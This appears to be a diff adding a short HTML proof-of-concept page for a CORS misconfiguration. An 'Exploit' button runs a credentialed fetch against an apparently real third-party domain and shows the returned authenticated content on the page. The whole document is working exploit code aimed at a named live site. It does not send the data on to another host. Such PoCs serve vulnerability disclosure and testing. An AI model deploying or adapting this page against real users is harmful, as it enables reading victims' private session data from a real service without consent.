@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS PoC</title></head>
+<body>
+  <h1>CORS Exploit</h1>
+  <button onclick="exploit()">Exploit</button>
+  <pre id="output"></pre>
+  <script>
+    function exploit() {
+      fetch("https://tracking2.dominos.co.in", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("output").innerText = data;
+      });
+    }
+  </script>
+</body>
+</html>
